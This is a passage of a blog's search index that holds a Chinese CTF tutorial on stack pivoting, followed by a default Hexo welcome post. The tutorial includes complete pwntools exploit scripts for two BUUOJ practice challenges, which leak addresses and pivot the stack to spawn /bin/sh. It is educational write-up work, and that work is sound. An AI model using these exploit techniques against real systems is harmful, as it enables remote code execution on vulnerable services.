      <tag>ORW</tag>
      
      <tag>极客大挑战_2019_Not_Bad</tag>
      
      <tag>HGAME_2023_week1_orw</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>栈迁移学习总结</title>
    <link href="/2024/11/07/%E6%A0%88%E8%BF%81%E7%A7%BB%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
    <url>/2024/11/07/%E6%A0%88%E8%BF%81%E7%A7%BB%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<div class="markdown-body"><h1 id="前置知识：什么是栈迁移？"><a href="#前置知识：什么是栈迁移？" class="headerlink" title="前置知识：什么是栈迁移？"></a>前置知识：什么是栈迁移？</h1><blockquote><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/fancy-rop/#stack-pivoting">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/fancy-rop/#stack-pivoting</a></p></blockquote><p>首先看一下正常的程序结构，函数在结束时会进行leave和ret指令<br>——leave做两件事，第一件事是mov esp,ebp，也就是将esp移到ebp的位置，第二件事是pop ebp，也就是将ebp移到上一个函数的记录的位置上去<br>——ret就做一件事pop eip，也就是将esp中的内容弹入eip中，也就是内容放到程序的执行流上。<br><img src="/img/p1/s1.PNG"><br>在栈迁移中，很多情况下我们需要在栈上的返回地址覆盖为leave_ret的gadget上（这里的0xcffc），让程序执行两次leave_ret，那连续的两个leave_ret后栈会发生什么变化呢？<br>回到初始状态，假设我们的栈可以溢出到返回地址，我们将ebp覆盖为esp的地址（0xcfd0），返回地址覆盖为一个leave_ret的gadget，观察下面的图<br><img src="/img/p1/s2.PNG"><br>可以看到，栈在经历过两次leave_ret后，程序的执行流又回到了我们的栈空间，那如果我们在写入数据的时候，从0xcfd4的位置开始写入我们的system函数的地址，那就可以把system函数放到程序的执行流，从而执行我们的system(‘&#x2F;bin&#x2F;sh’)</p><hr><p>通过两道例题实践栈迁移</p><h1 id="例1：ciscn-2019-es-2"><a href="#例1：ciscn-2019-es-2" class="headerlink" title="例1：ciscn_2019_es_2"></a>例1：ciscn_2019_es_2</h1><blockquote><p><a href="https://buuoj.cn/challenges#ciscn_2019_es_2">https://buuoj.cn/challenges#ciscn_2019_es_2</a></p></blockquote><p>checksec;file：32位，开启NX保护<br><img src="/img/p1/s3.PNG"></p><p>IDA里面分析，栈溢出发生在vul函数，但是只可以溢出0x8的字节，这只能够覆盖ebp_main和返回地址，而想再向栈上像ret2text那样写入system和binsh显然不可行<br><img src="/img/p1/s4.PNG"></p><p>这个时候就要考虑栈迁移了<br>程序存在system函数，但没有binsh字符串，我们需要向某个地址写入binsh<br><img src="/img/p1/s5.PNG"></p><p>那向哪个位置写入我们的binsh呢？其实就可以写到这个栈中，只要拿到了ebp的地址，就可以通过偏移拿到栈上任意内容的地址。<br>那ebp的地址怎么拿到呢？我们知道read函数结束时会自动加‘\x00’作为字符串的截断，然后输出时遇到’\x00’停止输出，如果我们在第一次read的时候给他填满0x30个字符，那么read就没地方给他补上’\x00’了，那么输出的时候打印完0x30个字符，就会继续打印出ebp的地址了。<br>第一次read拿到ebp的地址后，第二次read就要控制程序的执行流了<br>根据前置知识布置一下栈结构<br><img src="/img/p1/s6.PNG"></p><p>gdb调试看一下read后的栈结构，偏移为0x28(&#x3D;0xf8-0xd0)，同时这个0x28也是我们写入的字符串距离ebp的位置<br><img src="/img/p1/s7.PNG"></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">esp_addr</span> = ebp_addr - <span class="hljs-number">0</span>x38    <span class="hljs-comment">#这是我们迁移的位置(迁移到栈顶)</span><br><span class="hljs-attr">binsh_addr</span> = ebp_addr - <span class="hljs-number">0</span>x28    <span class="hljs-comment">#这是我们写入的binsh距离ebp的位置</span><br></code></pre></td></tr></table></figure><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>,<span class="hljs-built_in">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-built_in">io</span> = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">26904</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./ciscn_2019_es_2&#x27;</span>)<br><br>system_addr = elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>leave_ret = <span class="hljs-number">0x08048562</span>          #<span class="hljs-number">0x08048562</span> : leave ; ret<br><br>payload1 = b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">36</span> + b<span class="hljs-string">&#x27;bbbb&#x27;</span><br><span class="hljs-built_in">io</span>.sendafter(<span class="hljs-string">&#x27;name?\n&#x27;</span>,payload1)<br><span class="hljs-built_in">io</span>.recvuntil(b<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>ebp_addr = u32(<span class="hljs-built_in">io</span>.recv(<span class="hljs-number">4</span>))<br>success(hex(ebp_addr))<br>esp_addr = ebp_addr - <span class="hljs-number">0x38</span><br>binsh_addr = ebp_addr - <span class="hljs-number">0x28</span><br><br>payload2 = b<span class="hljs-string">&#x27;aaaa&#x27;</span>+ p32(system_addr) + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(binsh_addr) + b<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span><br>payload2 = payload2.ljust(<span class="hljs-number">0x28</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>) + p32(ebp_addr<span class="hljs-number">-0x38</span>) + p32(leave_ret)<br><br><span class="hljs-built_in">io</span>.sendline(payload2)<br><span class="hljs-built_in">io</span>.interactive()<br></code></pre></td></tr></table></figure><h1 id="例2：-Black-Watch-入群题-PWN1"><a href="#例2：-Black-Watch-入群题-PWN1" class="headerlink" title="例2：[Black Watch 入群题]PWN1"></a>例2：[Black Watch 入群题]PWN1</h1><blockquote><p><a href="https://buuoj.cn/challenges#[Black%20Watch%20%E5%85%A5%E7%BE%A4%E9%A2%98]PWN">https://buuoj.cn/challenges#[Black%20Watch%20%E5%85%A5%E7%BE%A4%E9%A2%98]PWN</a></p></blockquote><p>checksec;file，32位，开启NX保护<br><img src="/img/p1/s8.png"><br>放到IDA里面分析，栈溢出发生在vul_function的buf，溢出的长度为0x20-0x18&#x3D;0x8个字节，跟例1一样，能覆盖掉ebp和返回地址</p><p><img src="/img/p1/s9.png"></p><p>而与上题有两点不同：<br>一是没有system，所以首先要泄露libc里的函数的地址，然后用libc里的system函数和binsh字符串get shell；<br>二是这里有个变量s，她存到了程序的bss段，bss段我们可以写入0x200的数据。<strong>例1我们是把栈迁移回了栈中，这里我们要把栈迁移到bss段去。</strong><br><img src="/img/p1/s10.png"></p><p>所以我们的思路是，</p><ol><li><p>先泄露write函数的真实地址，然后通过计算libc的基地址拿到libc中的system函数的地址，注意write_plt之后的返回地址要返回到main函数，因为两次read不够我们完成整个利用。</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-attr"># 第一次read的payload1</span>和对应bss段中的结构 <br>payload<span class="hljs-number">1</span> = b<span class="hljs-string">&#x27;aaaa&#x27;</span>+p<span class="hljs-number">32</span><span class="hljs-comment">(write_plt)</span>+p<span class="hljs-number">32</span><span class="hljs-comment">(main_addr)</span>+p<span class="hljs-number">32</span><span class="hljs-comment">(1)</span>+p<span class="hljs-number">32</span><span class="hljs-comment">(write_got)</span>+p<span class="hljs-number">32</span><span class="hljs-comment">(4)</span><br></code></pre></td></tr></table></figure><p><img src="/img/p1/s11.png"></p></li><li><p>第二次read我们要将ebp覆盖为bss段的开头（0xa300）、返回地址覆盖为leave_ret，这样栈和bss段的变化就是这样的<br><img src="/img/p1/s12.png"><br>此时的eip实行write_plt(1,write_got,4)，泄露write函数的真实地址</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-attr"># 第二次read的payload2</span> <br>payload<span class="hljs-number">2</span>=cyclic<span class="hljs-comment">(0x18)</span>+p<span class="hljs-number">32</span><span class="hljs-comment">(bss)</span>+p<span class="hljs-number">32</span><span class="hljs-comment">(leave_ret)</span> <br></code></pre></td></tr></table></figure></li></ol><p>这样我就可以拿到了write函数的真实地址，可以计算出system和binsh的地址。<br>3. 在write函数执行完之后，我们的程序会回到main函数，继续第三次read，此时我们在bss段放入system和binsh</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-attr"># 第三次read的payload3</span> <br>payload<span class="hljs-number">3</span>=<span class="hljs-string">&#x27;aaaa&#x27;</span>+p<span class="hljs-number">32</span><span class="hljs-comment">(sys_addr)</span>+p<span class="hljs-number">32</span><span class="hljs-comment">(0xdeadbeef)</span>+p<span class="hljs-number">32</span><span class="hljs-comment">(binsh_addr)</span><br></code></pre></td></tr></table></figure><ol start="4"><li>来到第四次read，将ebp覆盖为3中bss段的开头（0xa300）、返回地址覆盖为leave_ret，执行我们第3步在bss段布置的system(‘&#x2F;bin&#x2F;sh’)</li></ol><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs lua">from pwn import *<br>from LibcSearcher import *<br>context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>,<span class="hljs-built_in">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-built_in">io</span> = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">28739</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./spwn&#x27;</span>)<br><br># 第一次<span class="hljs-built_in">read</span><br>write_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>payload1 = b<span class="hljs-string">&#x27;aaaa&#x27;</span> + p32(write_plt) + p32(main_addr) +  p32(<span class="hljs-number">1</span>) + p32(write_got) + p32(<span class="hljs-number">4</span>)<br><span class="hljs-built_in">io</span>.sendafter(b<span class="hljs-string">&#x27;What is your name?&#x27;</span>,payload1)<br><br># 第二次<span class="hljs-built_in">read</span><br>bss = <span class="hljs-number">0x0804A300</span><br>leave_ret = <span class="hljs-number">0x08048511</span><br>payload2 = cyclic(<span class="hljs-number">0x18</span>)+p32(bss)+p32(leave_ret)<br><span class="hljs-built_in">io</span>.sendafter(b<span class="hljs-string">&#x27;What do you want to say?&#x27;</span>,payload2)<br>write_addr = u32(<span class="hljs-built_in">io</span>.recv(<span class="hljs-number">4</span>))<br>success(hex(write_addr))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>,write_addr)<br>libc_base = write_addr - libc.<span class="hljs-built_in">dump</span>(<span class="hljs-string">&#x27;write&#x27;</span>)<br>system_addr = libc_base + libc.<span class="hljs-built_in">dump</span>(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh_addr = libc_base + libc.<span class="hljs-built_in">dump</span>(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br># 第三次<span class="hljs-built_in">read</span><br>payload3 = b<span class="hljs-string">&#x27;aaaa&#x27;</span> + p32(system_addr) + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(binsh_addr)<br><span class="hljs-built_in">io</span>.sendafter(b<span class="hljs-string">&#x27;What is your name?&#x27;</span>,payload3)<br><br># 第四次<span class="hljs-built_in">read</span><br>payload4 = cyclic(<span class="hljs-number">0x18</span>)+p32(bss)+p32(leave_ret)<br><span class="hljs-built_in">io</span>.sendafter(b<span class="hljs-string">&#x27;What do you want to say?&#x27;</span>,payload4)<br><br><span class="hljs-built_in">io</span>.interactive()<br></code></pre></td></tr></table></figure></div>]]></content>
    
    
    <categories>
      
      <category>pwn学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>栈迁移</tag>
      
      <tag>ciscn_2019_es_2</tag>
      
      <tag>Black Watch 入群题-PWN1</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/11/02/hello-world/"/>
    <url>/2024/11/02/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
